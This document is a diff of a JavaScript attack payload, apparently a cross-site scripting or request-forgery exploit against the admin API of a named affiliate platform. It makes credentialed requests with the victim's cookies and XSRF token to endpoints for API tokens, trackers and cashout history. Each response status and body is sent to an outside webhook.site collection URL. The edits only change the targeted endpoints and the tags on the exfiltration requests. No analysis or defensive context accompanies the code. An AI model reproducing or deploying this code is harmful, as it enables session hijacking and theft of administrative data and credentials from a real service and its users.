@@ -21,7 +21,7 @@ var xmlHttp11 = new XMLHttpRequest();
     xmlHttp11.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030/?a="+JSON.stringify(dataToSend) , false ); // false for synchronous request
     xmlHttp11.send( null );
 
-fetch('https://affiliates-api.ggpartners.com/api2/admin/profile/api_tokens', {
+fetch('https://affiliates-api.ggpartners.com/api2/admin/trackers/list', {
   method: 'POST', // Specify the HTTP method as POST
   credentials: 'include',
   mode: 'cors',
@@ -67,7 +67,7 @@ fetch('https://affiliates-api.ggpartners.com/api2/admin/affiliate_cashouts/appro
         "Content-Type": "application/json",
     "Access-Control-Allow-Credentials": true,
 "Access-Control-Allow-Origin": "*",
-"X-Http-Method-Override": "POST"
+    "X-Http-Method-Override": "POST"
       },
   body: JSON.stringify(dataToSend) // Convert the JavaScript object to a JSON string
 })
@@ -131,7 +131,7 @@ fetch('https://affiliates-api.ggpartners.com/api2/admin/affiliate_cashouts/appro
 });
 
 
-fetch('https://affiliates-api.ggpartners1.com/api2/admin/profile/api_tokens', {
+fetch('https://affiliates-api.ggpartners1.com/api2/admin/trackers/list', {
   method: 'POST', // Specify the HTTP method as POST
   credentials: 'include',
   mode: 'cors',
@@ -148,14 +148,14 @@ fetch('https://affiliates-api.ggpartners1.com/api2/admin/profile/api_tokens', {
 .then(response => {
   if (!response.ok) {
     var xmlHttp = new XMLHttpRequest();
-    xmlHttp.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030?a="+response.status, false ); // false for synchronous request
+    xmlHttp.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030?ab="+response.status, false ); // false for synchronous request
     xmlHttp.send( null );
       throw new Error(`HTTP error! status: ${response.status}`);
     }
   a = response.json(); // Parse the JSON response from the server
  const jsonString = JSON.stringify(a );
   var xmlHttp = new XMLHttpRequest();
-    xmlHttp.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030?a="+jsonString, false ); // false for synchronous request
+    xmlHttp.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030?ab="+jsonString, false ); // false for synchronous request
     xmlHttp.send( null );
     return xmlHttp.responseText;
 })
@@ -170,7 +170,6 @@ fetch('https://affiliates-api.ggpartners1.com/api2/admin/profile/api_tokens', {
 
 fetch('https://affiliates-api.ggpartners1.com/api2/admin/affiliate_cashouts/approved_and_declined_history/list', {
   method: 'POST', // Specify the HTTP method as POST
-  credentials: 'include',
   mode: 'cors',
   headers: {
        "X-XSRF-TOKEN": getCookie("XSRF-TOKEN-X"), 
@@ -185,14 +184,14 @@ fetch('https://affiliates-api.ggpartners1.com/api2/admin/affiliate_cashouts/appr
 .then(response => {
   if (!response.ok) {
     var xmlHttp = new XMLHttpRequest();
-    xmlHttp.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030?a="+response.status, false ); // false for synchronous request
+    xmlHttp.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030?ac="+response.status, false ); // false for synchronous request
     xmlHttp.send( null );
       throw new Error(`HTTP error! status: ${response.status}`);
     }
   a = response.json(); // Parse the JSON response from the server
  const jsonString = JSON.stringify(a );
   var xmlHttp = new XMLHttpRequest();
-    xmlHttp.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030?a="+jsonString, false ); // false for synchronous request
+    xmlHttp.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030?ac="+jsonString, false ); // false for synchronous request
     xmlHttp.send( null );
     return xmlHttp.responseText;
 })
@@ -207,6 +206,7 @@ fetch('https://affiliates-api.ggpartners1.com/api2/admin/affiliate_cashouts/appr
 
 fetch('https://affiliates-api.ggpartners1.com/api2/admin/affiliate_cashouts/approved_and_declined_history/list', {
   method: 'POST', // Specify the HTTP method as POST
+  credentials: 'include',
   mode: 'cors',
   headers: {
         "X-XSRF-TOKEN": getCookie("XSRF-TOKEN-X"), 
@@ -221,14 +221,14 @@ fetch('https://affiliates-api.ggpartners1.com/api2/admin/affiliate_cashouts/appr
 .then(response => {
   if (!response.ok) {
     var xmlHttp = new XMLHttpRequest();
-    xmlHttp.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030?a="+response.status, false ); // false for synchronous request
+    xmlHttp.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030?da="+response.status, false ); // false for synchronous request
     xmlHttp.send( null );
       throw new Error(`HTTP error! status: ${response.status}`);
     }
   a = response.json(); // Parse the JSON response from the server
  const jsonString = JSON.stringify(a );
   var xmlHttp = new XMLHttpRequest();
-    xmlHttp.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030?a="+jsonString, false ); // false for synchronous request
+    xmlHttp.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030?ad="+jsonString, false ); // false for synchronous request
     xmlHttp.send( null );
     return xmlHttp.responseText;
 })
